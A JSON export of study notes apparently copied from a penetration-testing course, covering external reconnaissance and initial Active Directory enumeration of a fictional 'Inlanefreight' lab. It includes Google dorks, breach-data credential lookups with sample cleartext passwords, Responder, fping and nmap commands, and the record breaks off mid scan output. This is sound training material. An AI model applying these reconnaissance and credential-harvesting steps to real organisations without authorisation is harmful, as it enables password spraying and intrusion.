    "content": "\n---\n\nBefore kicking off any pentest, it can be beneficial to perform `external reconnaissance` of your target. This can serve many different functions, such as:\n\n- Validating information provided to you in the scoping document from the client\n- Ensuring you are taking actions against the appropriate scope when working remotely\n- Looking for any information that is publicly accessible that can affect the outcome of your test, such as leaked credentials\n\nThink of it like this; we are trying to get the `lay of the land` to ensure we provide the most comprehensive test possible for our customer. That also means identifying any potential information leaks and breach data out in the world. This can be as simple as gleaning a username format from the customer's main website or social media. We may also dive as deep as scanning GitHub repositories for credentials left in code pushes, hunting in documents for links to an intranet or remotely accessible sites, and just looking for any information that can key us in on how the enterprise environment is configured.\n\n---\n\n## What Are We Looking For?\n\nWhen conducting our external reconnaissance, there are several key items that we should be looking for. This information may not always be publicly accessible, but it would be prudent to see what is out there. If we get stuck during a penetration test, looking back at what could be obtained through passive recon can give us that nudge needed to move forward, such as password breach data that could be used to access a VPN or other externally facing service. The table below highlights the \"`What`\" in what we would be searching for during this phase of our engagement.\n\n|**Data Point**|**Description**|\n|---|---|\n|`IP Space`|Valid ASN for our target, netblocks in use for the organization's public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.|\n|`Domain Information`|Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? (SIEM, AV, IPS/IDS in use, etc.)|\n|`Schema Format`|Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.|\n|`Data Disclosures`|For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. For example, any published files that contain `intranet` site listings, user metadata, shares, or other critical software or hardware in the environment (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.)|\n|`Breach Data`|Any publicly released usernames, passwords, or other critical information that can help an attacker gain a foothold.|\n\nWe have addressed the `why` and `what` of external reconnaissance; let's dive into the `where` and `how`.\n\n---\n\n## Where Are We Looking?\n\nOur list of data points above can be gathered in many different ways. There are many different websites and tools that can provide us with some or all of the information above that we could use to obtain information vital to our assessment. The table below lists a few potential resources and examples that can be used.\n\n|**Resource**|**Examples**|\n|---|---|\n|`ASN / IP registrars`|[IANA](https://www.iana.org/), [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/)|\n|`Domain Registrars & DNS`|[Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), manual DNS record requests against the domain in question or against well known DNS servers, such as `8.8.8.8`.|\n|`Social Media`|Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.|\n|`Public-Facing Company Websites`|Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the \"About Us\" and \"Contact Us\" pages can also be gold mines.|\n|`Cloud & Dev Storage Spaces`|[GitHub](https://github.com/), [AWS S3 buckets & Azure Blog storage containers](https://grayhatwarfare.com/), [Google searches using \"Dorks\"](https://www.exploit-db.com/google-hacking-database)|\n|`Breach Data Sources`|[HaveIBeenPwned](https://haveibeenpwned.com/) to determine if any corporate email accounts appear in public breach data, [Dehashed](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication.|\n\n### Finding Address Spaces\n\n![Welcome to Hurricane Electric BGP Toolkit. Displays visitor IP 72.185.168.230, announced as 72.184.0.0/14, ISP AS33363 (Charter Communications).](https://academy.hackthebox.com/storage/modules/143/bgp-toolkit.png)\n\nThe `BGP-Toolkit` hosted by [Hurricane Electric](http://he.net/) is a fantastic resource for researching what address blocks are assigned to an organization and what ASN they reside within. Just punch in a domain or IP address, and the toolkit will search for any results it can. We can glean a lot from this info. Many large corporations will often self-host their infrastructure, and since they have such a large footprint, they will have their own ASN. This will typically not be the case for smaller organizations or fledgling companies. As you research, keep this in mind since smaller organizations will often host their websites and other infrastructure in someone else's space (Cloudflare, Google Cloud, AWS, or Azure, for example). Understanding where that infrastructure resides is extremely important for our testing. We have to ensure we are not interacting with infrastructure out of our scope. If we are not careful while pentesting against a smaller organization, we could end up inadvertently causing harm to another organization sharing that infrastructure. You have an agreement to test with the customer, not with others on the same server or with the provider. Questions around self-hosted or 3rd party managed infrastructure should be handled during the scoping process and be clearly listed in any scoping documents you receive.\n\nIn some cases, your client may need to get written approval from a third-party hosting provider before you can test. Others, such as AWS, have specific [guidelines](https://aws.amazon.com/security/penetration-testing/) for performing penetration tests and do not require prior approval for testing some of their services. Others, such as Oracle, ask you to submit a [Cloud Security Testing Notification](https://docs.oracle.com/en-us/iaas/Content/Security/Concepts/security_testing-policy_notification.htm). These types of steps should be handled by your company management, legal team, contracts team, etc. If you are in doubt, escalate before attacking any external-facing services you are unsure of during an assessment. It is our responsibility to ensure that we have explicit permission to attack any hosts (both internal and external), and stopping and clarifying the scope in writing never hurts.\n\n### DNS\n\nDNS is a great way to validate our scope and find out about reachable hosts the customer did not disclose in their scoping document. Sites like [domaintools](https://whois.domaintools.com/), and [viewdns.info](https://viewdns.info/) are great spots to start. We can get back many records and other data ranging from DNS resolution to testing for DNSSEC and if the site is accessible in more restricted countries. Sometimes we may find additional hosts out of scope, but look interesting. In that case, we could bring this list to our client to see if any of them should indeed be included in the scope. We may also find interesting subdomains that were not listed in the scoping documents, but reside on in-scope IP addresses and therefore are fair game.\n\n#### Viewdns.info\n\n![ViewDNS.info tools page with options for Reverse IP Lookup, Reverse Whois Lookup, IP History, DNS Report, Reverse MX Lookup, Reverse NS Lookup, IP Location Finder, Chinese Firewall Test, DNS Propagation Checker, Is My Site Down, Iran Firewall Test, and Domain/IP Whois.](https://academy.hackthebox.com/storage/modules/143/viewdnsinfo.png)\n\nThis is also a great way to validate some of the data found from our IP/ASN searches. Not all information about the domain found will be current, and running checks that can validate what we see is always good practice.\n\n### Public Data\n\nSocial media can be a treasure trove of interesting data that can clue us in to how the organization is structured, what kind of equipment they operate, potential software and security implementations, their schema, and more. On top of that list are job-related sites like LinkedIn, Indeed.com, and Glassdoor. Simple job postings often reveal a lot about a company. For example, take a look at the job listing below. It's for a `SharePoint Administrator` and can key us in on many things. We can tell from the listing that the company has been using SharePoint for a while and has a mature program since they are talking about security programs, backup & disaster recovery, and more. What is interesting to us in this posting is that we can see the company likely uses SharePoint 2013 and SharePoint 2016. That means they may have upgraded in place, potentially leaving vulnerabilities in play that may not exist in newer versions. This also means we may run into different versions of SharePoint during our engagements.\n\n### Sharepoint Admin Job Listing\n\n![Job description for a remote SharePoint Administrator with 8+ years experience, requiring skills in application deployment, SharePoint, Azure, PHP, teamwork, and enterprise applications.](https://academy.hackthebox.com/storage/modules/143/spjob2.png)\n\nDon't discount public information such as job postings or social media. You can learn a lot about an organization just from what they post, and a well-intentioned post could disclose data relevant to us as penetration testers.\n\nWebsites hosted by the organization are also great places to dig for information. We can gather contact emails, phone numbers, organizational charts, published documents, etc. These sites, specifically the embedded documents, can often have links to internal infrastructure or intranet sites that you would not otherwise know about. Checking any publicly accessible information for those types of details can be quick wins when trying to formulate a picture of the domain structure. With the growing use of sites such as GitHub, AWS cloud storage, and other web-hosted platforms, data can also be leaked unintentionally. For example, a dev working on a project may accidentally leave some credentials or notes hardcoded into a code release. If you know where to look for that data, it can give you an easy win. It could mean the difference between having to password spray and brute-force credentials for hours or days or gaining a quick foothold with developer credentials, which may also have elevated permissions. Tools like [Trufflehog](https://github.com/trufflesecurity/truffleHog) and sites like [Greyhat Warfare](https://buckets.grayhatwarfare.com/) are fantastic resources for finding these breadcrumbs.\n\nWe have spent some time discussing external enumeration and recon of an organization, but this is just one piece of the puzzle. For a more detailed introduction to OSINT and external enumeration, check out the [Footprinting](https://academy.hackthebox.com/course/preview/footprinting) and [OSINT:Corporate Recon](https://academy.hackthebox.com/course/preview/osint-corporate-recon) modules.\n\nUp to this point, we have been mostly passive in our discussions. As you move forward into the pentest, you will become more hands-on, validating the information you have found and probing the domain for more information. Let's take a minute to discuss enumeration principles and how we can put a process in place to perform these actions.\n\n---\n\n## Overarching Enumeration Principles\n\nKeeping in mind that our goal is to understand our target better, we are looking for every possible avenue we can find that will provide us with a potential route to the inside. Enumeration itself is an iterative process we will repeat several times throughout a penetration test. Besides the customer's scoping document, this is our primary source of information, so we want to ensure we are leaving no stone unturned. When starting our enumeration, we will first use `passive` resources, starting wide in scope and narrowing down. Once we exhaust our initial run of passive enumeration, we will need to examine the results and then move into our active enumeration phase.\n\n---\n\n## Example Enumeration Process\n\nWe have already covered quite a few concepts pertaining to enumeration. Let's start putting it all together. We will practice our enumeration tactics on the `inlanefreight.com` domain without performing any heavy scans (such as Nmap or vulnerability scans which are out of scope). We will start first by checking our Netblocks data and seeing what we can find.\n\n#### Check for ASN/IP & Domain Data\n\n![DNS info for inlanefreight.com: Start of Authority with AWS DNS, nameservers ns1 and ns2.inlanefreight.com, mail exchanger mail1.inlanefreight.com, A record 134.209.24.248, and AAAA record 2A03:B0C0:1:E0::32C:B001.](https://academy.hackthebox.com/storage/modules/143/BGPhe-inlane.png)\n\nFrom this first look, we have already gleaned some interesting info. BGP.he is reporting:\n\n- IP Address: 134.209.24.248\n- Mail Server: mail1.inlanefreight.com\n- Nameservers: NS1.inlanefreight.com & NS2.inlanefreight.com\n\nFor now, this is what we care about from its output. Inlanefreight is not a large corporation, so we didn't expect to find that it had its own ASN. Now let's validate some of this information.\n\n#### Viewdns Results\n\n![Reverse IP results for inlanefreight.com showing two domains: inlanefreight.com and lycjg.us, with last resolved dates.](https://academy.hackthebox.com/storage/modules/143/viewdns-results.png)\n\nIn the request above, we utilized `viewdns.info` to validate the IP address of our target. Both results match, which is a good sign. Now let's try another route to validate the two nameservers in our results.\n\nExternal Recon and Enumeration Principles\n\n```shell-session\ndrxh3kr@htb[/htb]$ nslookup ns1.inlanefreight.com\n\nServer:\t\t192.168.186.1\nAddress:\t192.168.186.1#53\n\nNon-authoritative answer:\nName:\tns1.inlanefreight.com\nAddress: 178.128.39.165\n\nnslookup ns2.inlanefreight.com\nServer:\t\t192.168.86.1\nAddress:\t192.168.86.1#53\n\nNon-authoritative answer:\nName:\tns2.inlanefreight.com\nAddress: 206.189.119.186 \n```\n\nWe now have `two` new IP addresses to add to our list for validation and testing. Before taking any further action with them, ensure they are in-scope for your test. For our purposes, the actual IP addresses would not be in scope for scanning, but we could passively browse any websites to hunt for interesting data. For now, that is it with enumerating domain information from DNS. Let's take a look at the publicly available information.\n\nInlanefreight is a fictitious company that we are using for this module, so there is no real social media presence. However, we would check sites like LinkedIn, Twitter, Instagram, and Facebook for helpful info if it were real. Instead, we will move on to examining the website `inlanefreight.com`.\n\nThe first check we ran was looking for any documents. Using `filetype:pdf inurl:inlanefreight.com` as a search, we are looking for PDFs.\n\n#### Hunting For Files\n\n![Google search result for 'filetype:pdf inurl:inlanefreight.com' showing a PDF titled 'corporate goals and strategy - Inlanefreight' from inlanefreight.com.](https://academy.hackthebox.com/storage/modules/143/google-dorks.png)\n\nOne document popped up, so we need to ensure we note the document and its location and download a copy locally to dig through. It is always best to save files, screenshots, scan output, tool output, etc., as soon as we come across them or generate them. This helps us keep as comprehensive a record as possible and not risk forgetting where we saw something or losing critical data. Next, let's look for any email addresses we can find.\n\n#### Hunting E-mail Addresses\n\n![Google search for 'intext:\"@inlanefreight.com\" inurl:inlanefreight.com' showing results for Inlanefreight's homepage and contact page.](https://academy.hackthebox.com/storage/modules/143/intext-dork.png)\n\nUsing the dork `intext:\"@inlanefreight.com\" inurl:inlanefreight.com`, we are looking for any instance that appears similar to the end of an email address on the website. One promising result came up with a contact page. When we look at the page (pictured below), we can see a large list of employees and contact info for them. This information can be helpful since we can determine that these people are at least most likely active and still working with the company.\n\n#### E-mail Dork Results\n\nBrowsing the [contact page](https://www.inlanefreight.com/index.php/contact/), we can see several emails for staff in different offices around the globe. We now have an idea of their email naming convention (first.last) and where some people work in the organization. This could be handy in later password spraying attacks or if social engineering/phishing were part of our engagement scope.\n\n![Contact information for Inlanefreight sales executives in the United States: Emma Williams, John Smith, and David Jones with their respective email addresses.](https://academy.hackthebox.com/storage/modules/143/ilfreightemails.png)\n\n#### Username Harvesting\n\nWe can use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to scrape data from a company's LinkedIn page and create various mashups of usernames (flast, first.last, f.last, etc.) that can be added to our list of potential password spraying targets.\n\n#### Credential Hunting\n\n[Dehashed](http://dehashed.com/) is an excellent tool for hunting for cleartext credentials and password hashes in breach data. We can search either on the site or using a script that performs queries via the API. Typically we will find many old passwords for users that do not work on externally-facing portals that use AD auth (or internal), but we may get lucky! This is another tool that can be useful for creating a user list for external or internal password spraying.\n\nNote: For our purposes, the sample data below is fictional.\n\nExternal Recon and Enumeration Principles\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p\n\nid : 5996447501\nemail : roger.grimes@inlanefreight.local\nusername : rgrimes\npassword : Ilovefishing!\nhashed_password : \nname : Roger Grimes\nvin : \naddress : \nphone : \ndatabase_name : ModBSolutions\n\nid : 7344467234\nemail : jane.yu@inlanefreight.local\nusername : jyu\npassword : Starlight1982_!\nhashed_password : \nname : Jane Yu\nvin : \naddress : \nphone : \ndatabase_name : MyFitnessPal\n\n<SNIP>\n```\n\n`Note`: The script used in the example above can be found [here](https://github.com/mrb3n813/Pentest-stuff/blob/master/dehashed.py). Due to changes in the API structure of DeHashed, modifications may be necessary. Alternatively, the following [script](https://github.com/sm00v/Dehashed) could be used. Before executing the script, it is crucial to become familiar with its functionality.\n\nNow that we have a hang of this try your hand at searching for other results related to the inlanefreight.com domain. What can you find? Are there any other useful files, pages, or information embedded on the site? This section demonstrated the importance of thoroughly analyzing our target, provided that we stay in scope and do not test anything we are not authorized to and stay within the time constraints of the engagement. I have had quite a few assessments where I was having trouble gaining a foothold from an anonymous standpoint on the internal network and resorted to creating a wordlist using varying outside sources (Google, LinkedIn scraping, Dehashed, etc.) and then performed targeted internal password spraying to get valid credentials for a standard domain user account. As we will see in the following sections, we can perform the vast majority of our internal AD enumeration with just a set of low-privilege domain user credentials and even many attacks. The fun starts once we have a set of credentials. Let's move into internal enumeration and begin analyzing the internal `INLANEFREIGHT.LOCAL` domain passively and actively per our assessment's scope and rules of engagement.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/06-Initial Enumeration of the Domain",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/06-Initial Enumeration of the Domain.md",
    "title": "06 Initial Enumeration Of The Domain",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- We are at the very beginning of our AD-focused penetration test against Inlanefreight. We have done some basic information gathering and gotten a picture of what to expect from the customer via th...",
    "category": "02_CPTS",
    "content": "\n---\n\nWe are at the very beginning of our AD-focused penetration test against Inlanefreight. We have done some basic information gathering and gotten a picture of what to expect from the customer via the scoping documents.\n\n---\n\n## Setting Up\n\nFor this first portion of the test, we are starting on an attack host placed inside the network for us. This is one common way that a client might select for us to perform an internal penetration test. A list of the types of setups a client may choose for testing includes:\n\n- A penetration testing distro (typically Linux) as a virtual machine in their internal infrastructure that calls back to a jump host we control over VPN, and we can SSH into.\n- A physical device plugged into an ethernet port that calls back to us over VPN, and we can SSH into.\n- A physical presence at their office with our laptop plugged into an ethernet port.\n- A Linux VM in either Azure or AWS with access to the internal network that we can SSH into using public key authentication and our public IP address whitelisted.\n- VPN access into their internal network (a bit limiting because we will not be able to perform certain attacks such as LLMNR/NBT-NS Poisoning).\n- From a corporate laptop connected to the client's VPN.\n- On a managed workstation (typically Windows), physically sitting in their office with limited or no internet access or ability to pull in tools. They may also elect this option but give you full internet access, local admin, and put endpoint protection into monitor mode so you can pull in tools at will.\n- On a VDI (virtual desktop) accessed using Citrix or the like, with one of the configurations described for the managed workstation typically accessible over VPN either remotely or from a corporate laptop.\n\nThese are the most common setups I have seen, though a client may come up with another variation of one of these. The client may also choose from a \"grey box\" approach where they give us just a list of in-scope IP addresses/CIDR network ranges, or \"black box\" where we have to plug in and do all discovery blindly using various techniques. Finally, they can choose either evasive, non-evasive, or hybrid evasive (starting \"quiet\" and slowly getting louder to see what threshold we are detected at and then switching to non-evasive testing. They may also elect to have us start with no credentials or from the perspective of a standard domain user.\n\nOur customer Inlanefreight has chosen the following approach because they are looking for as comprehensive an assessment as possible. At this time, their security program is not mature enough to benefit from any form of evasive testing or a \"black box\" approach.\n\n- A custom pentest VM within their internal network that calls back to our jump host, and we can SSH into it to perform testing.\n- They've also given us a Windows host that we can load tools onto if need be.\n- They've asked us to start from an unauthenticated standpoint but have also given us a standard domain user account (`htb-student`) which can be used to access the Windows attack host.\n- \"Grey box\" testing. They have given us the network range 172.16.5.0/23 and no other information about the network.\n- Non-evasive testing.\n\nWe have not been provided credentials or a detailed internal network map.\n\n---\n\n## Tasks\n\nOur tasks to accomplish for this section are:\n\n- Enumerate the internal network, identifying hosts, critical services, and potential avenues for a foothold.\n- This can include active and passive measures to identify users, hosts, and vulnerabilities we may be able to take advantage of to further our access.\n- Document any findings we come across for later use. Extremely important!\n\nWe will start from our Linux attack host without domain user credentials. It's a common thing to start a pentest off in this manner. Many organizations will wish to see what you can do from a blind perspective, such as this, before providing you with further information for the test. It gives a more realistic look at what potential avenues an adversary would have to use to infiltrate the domain. It can help them see what an attacker could do if they gain unauthorized access via the internet (i.e., a phishing attack), physical access to the building, wireless access from outside (if the wireless network touches the AD environment), or even a rogue employee. Depending on the success of this phase, the customer may provide us with access to a domain-joined host or a set of credentials for the network to expedite testing and allow us to cover as much ground as possible.\n\nBelow are some of the key data points that we should be looking for at this time and noting down into our notetaking tool of choice and saving scan/tool output to files whenever possible.\n\n#### Key Data Points\n\n|**Data Point**|**Description**|\n|---|---|\n|`AD Users`|We are trying to enumerate valid user accounts we can target for password spraying.|\n|`AD Joined Computers`|Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.|\n|`Key Services`|Kerberos, NetBIOS, LDAP, DNS|\n|`Vulnerable Hosts and Services`|Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)|\n\n---\n\n## TTPs\n\nEnumerating an AD environment can be overwhelming if just approached without a plan. There is an abundance of data stored in AD, and it can take a long time to sift if not looked at in progressive stages, and we will likely miss things. We need to set a game plan for ourselves and tackle it piece by piece. Everyone works in slightly different ways, so as we gain more experience, we'll start to develop our own repeatable methodology that works best for us. Regardless of how we proceed, we typically start in the same place and look for the same data points. We will experiment with many tools in this section and subsequent ones. It is important to reproduce every example and even try to recreate examples with different tools to see how they work differently, learn their syntax, and find what approach works best for us.\n\nWe will start with `passive` identification of any hosts in the network, followed by `active` validation of the results to find out more about each host (what services are running, names, potential vulnerabilities, etc.). Once we know what hosts exist, we can proceed with probing those hosts, looking for any interesting data we can glean from them. After we have accomplished these tasks, we should stop and regroup and look at what info we have. At this time, we'll hopefully have a set of credentials or a user account to target for a foothold onto a domain-joined host or have the ability to begin credentialed enumeration from our Linux attack host.\n\nLet's look at a few tools and techniques to help us with this enumeration.\n\n### Identifying Hosts\n\nFirst, let's take some time to listen to the network and see what's going on. We can use `Wireshark` and `TCPDump` to \"put our ear to the wire\" and see what hosts and types of network traffic we can capture. This is particularly helpful if the assessment approach is \"black box.\" We notice some [ARP](https://en.wikipedia.org/wiki/Address_Resolution_Protocol) requests and replies, [MDNS](https://en.wikipedia.org/wiki/Multicast_DNS), and other basic [layer two](https://www.juniper.net/documentation/us/en/software/junos/multicast-l2/topics/topic-map/layer-2-understanding.html) packets (since we are on a switched network, we are limited to the current broadcast domain) some of which we can see below. This is a great start that gives us a few bits of information about the customer's network setup.\n\nScroll to the bottom, spawn the target, connect to the Linux attack host using `xfreerdp` and fire up Wireshark to begin capturing traffic.\n\n#### Start Wireshark on ea-attack01\n\nInitial Enumeration of the Domain\n\n```shell-session\n┌─[htb-student@ea-attack01]─[~]\n└──╼ $sudo -E wireshark\n\n11:28:20.487     Main Warn QStandardPaths: runtime directory '/run/user/1001' is not owned by UID 0, but a directory permissions 0700 owned by UID 1001 GID 1002\n<SNIP>\n```\n\n#### Wireshark Output\n\n![Wireshark capture showing ARP requests from VMware sources to broadcast, querying IP addresses in the 172.16.5.x range.](https://academy.hackthebox.com/storage/modules/143/ea-wireshark.png)\n\n- ARP packets make us aware of the hosts: 172.16.5.5, 172.16.5.25 172.16.5.50, 172.16.5.100, and 172.16.5.125.\n\n  \n\n![Wireshark window showing MDNS queries from source IP 172.16.5.125 to destination 224.0.0.251, protocol MDNS, querying 'AAAA ACADEMY-EA-WEB0.local'.](https://academy.hackthebox.com/storage/modules/143/ea-wireshark-mdns.png)\n\n- MDNS makes us aware of the ACADEMY-EA-WEB01 host.\n\n  \n\nIf we are on a host without a GUI (which is typical), we can use [tcpdump](https://linux.die.net/man/8/tcpdump), [net-creds](https://github.com/DanMcInerney/net-creds), and [NetMiner](https://www.netminer.com/en/product/netminer.php), etc., to perform the same functions. We can also use tcpdump to save a capture to a .pcap file, transfer it to another host, and open it in Wireshark.\n\n#### Tcpdump Output\n\nInitial Enumeration of the Domain\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo tcpdump -i ens224 \n```\n\n![GIF showcasing the traffic seen by tcpdump on the ens224 interface.](https://academy.hackthebox.com/storage/modules/143/tcpdump-example.png)\n\nThere is no one right way to listen and capture network traffic. There are plenty of tools that can process network data. Wireshark and tcpdump are just a few of the easiest to use and most widely known. Depending on the host you are on, you may already have a network monitoring tool built-in, such as `pktmon.exe`, which was added to all editions of Windows 10. As a note for testing, it's always a good idea to save the PCAP traffic you capture. You can review it again later to look for more hints, and it makes for great additional information to include while writing your reports.\n\nOur first look at network traffic pointed us to a couple of hosts via `MDNS` and `ARP`. Now let's utilize a tool called `Responder` to analyze network traffic and determine if anything else in the domain pops up.\n\n[Responder](https://github.com/lgandx/Responder-Windows) is a tool built to listen, analyze, and poison `LLMNR`, `NBT-NS`, and `MDNS` requests and responses. It has many more functions, but for now, all we are utilizing is the tool in its Analyze mode. This will passively listen to the network and not send any poisoned packets. We'll cover this tool more in-depth in later sections.\n\n#### Starting Responder\n\nCode: bash\n\n```bash\nsudo responder -I ens224 -A \n```\n\n#### Responder Results\n\n![GIF showcasing and analyzing the traffic captured by responder on the ens224 interface.](https://academy.hackthebox.com/storage/modules/143/responder-example.gif)\n\nAs we start Responder with passive analysis mode enabled, we will see requests flow in our session. Notice below that we found a few unique hosts not previously mentioned in our Wireshark captures. It's worth noting these down as we are starting to build a nice target list of IPs and DNS hostnames.\n\nOur passive checks have given us a few hosts to note down for a more in-depth enumeration. Now let's perform some active checks starting with a quick ICMP sweep of the subnet using `fping`.\n\n[Fping](https://fping.org/) provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host. Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability. Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on. These checks will help us determine if anything else is active on the internal network. ICMP is not a one-stop-shop, but it is an easy way to get an initial idea of what exists. Other open ports and active protocols may point to new hosts for later targeting. Let's see it in action.\n\n#### FPing Active Checks\n\nHere we'll start `fping` with a few flags: `a` to show targets that are alive, `s` to print stats at the end of the scan, `g` to generate a target list from the CIDR network, and `q` to not show per-target results.\n\nInitial Enumeration of the Domain\n\n```shell-session\ndrxh3kr@htb[/htb]$ fping -asgq 172.16.5.0/23\n\n172.16.5.5\n172.16.5.25\n172.16.5.50\n172.16.5.100\n172.16.5.125\n172.16.5.200\n172.16.5.225\n172.16.5.238\n172.16.5.240\n\n     510 targets\n       9 alive\n     501 unreachable\n       0 unknown addresses\n\n    2004 timeouts (waiting for response)\n    2013 ICMP Echos sent\n       9 ICMP Echo Replies received\n    2004 other ICMP received\n\n 0.029 ms (min round trip time)\n 0.396 ms (avg round trip time)\n 0.799 ms (max round trip time)\n       15.366 sec (elapsed real time)\n```\n\nThe command above validates which hosts are active in the `/23` network and does it quietly instead of spamming the terminal with results for each IP in the target list. We can combine the successful results and the information we gleaned from our passive checks into a list for a more detailed scan with Nmap. From the `fping` command, we can see 9 \"live hosts,\" including our attack host.\n\nNote: Scan results in the target network will differ from the command output in this section due to the size of the lab network. It is still worth reproducing each example to practice how these tools work and note down every host that is live in this lab.\n\n#### Nmap Scanning\n\nNow that we have a list of active hosts within our network, we can enumerate those hosts further. We are looking to determine what services each host is running, identify critical hosts such as `Domain Controllers` and `web servers`, and identify potentially vulnerable hosts to probe later. With our focus on AD, after doing a broad sweep, it would be wise of us to focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos name a few. Below is a quick example of a simple Nmap scan.\n\nCode: bash\n\n```bash\nsudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum\n```\n\nThe [-A (Aggressive scan options)](https://nmap.org/book/man-misc-options.html) scan will perform several functions. One of the most important is a quick enumeration of well-known ports to include web services, domain services, etc. For our hosts.txt file, some of our results from Responder and fping overlapped (we found the name and IP address), so to keep it simple, just the IP address was fed into hosts.txt for the scan.\n\n#### NMAP Result Highlights\n\nInitial Enumeration of the Domain\n\n```shell-session\nNmap scan report for inlanefreight.local (172.16.5.5)\nHost is up (0.069s latency).\nNot shown: 987 closed tcp ports (conn-refused)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-04 15:12:06Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)\n|_ssl-date: 2022-04-04T15:12:53+00:00; -1s from scanner time.\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n| Issuer: commonName=INLANEFREIGHT-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2022-03-30T22:40:24\n| Not valid after:  2023-03-30T22:40:24\n| MD5:   3a09 d87a 9ccb 5498 2533 e339 ebe3 443f\n|_SHA-1: 9731 d8ec b219 4301 c231 793e f913 6868 d39f 7920\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)\n<SNIP>  \n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info:\n|   Target_Name: INLANEFREIGHT\n|   NetBIOS_Domain_Name: INLANEFREIGHT\n|   NetBIOS_Computer_Name: ACADEMY-EA-DC01\n|   DNS_Domain_Name: INLANEFREIGHT.LOCAL\n|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n|   DNS_Tree_Name: INLANEFREIGHT.LOCAL\n|   Product_Version: 10.0.17763\n|_  System_Time: 2022-04-04T15:12:45+00:00\n<SNIP>\n5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Service Unavailable\n|_http-server-header: Microsoft-HTTPAPI/2.0\nService Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n```\n\nOur scans have provided us with the naming standard used by NetBIOS and DNS, we can see some hosts have RDP open, and they have pointed us in the direction of the primary `Domain Controller` for the INLANEFREIGHT.LOCAL domain (ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL). The results below show some interesting results surrounding a possibly outdated host (not in our current lab).\n\nInitial Enumeration of the Domain\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap -A 172.16.5.100\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 13:42 EDT\nNmap scan report for 172.16.5.100\nHost is up (0.071s latency).\nNot shown: 989 closed tcp ports (conn-refused)\nPORT      STATE SERVICE      VERSION\n80/tcp    open  http         Microsoft IIS httpd 7.5\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Microsoft-IIS/7.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n443/tcp   open  https?\n445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7600 microsoft-ds\n1433/tcp  open  ms-sql-s     Microsoft SQL Server 2008 R2 10.50.1600.00; RTM\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2022-04-08T17:38:25\n|_Not valid after:  2052-04-08T17:38:25\n|_ssl-date: 2022-04-08T17:43:53+00:00; 0s from scanner time.\n| ms-sql-ntlm-info: \n|   Target_Name: INLANEFREIGHT\n|   NetBIOS_Domain_Name: INLANEFREIGHT\n|   NetBIOS_Computer_Name: ACADEMY-EA-CTX1\n|   DNS_Domain_Name: INLANEFREIGHT.LOCAL\n|   DNS_Computer_Name: ACADEMY-EA-CTX1.INLANEFREIGHT.LOCAL\n|_  Product_Version: 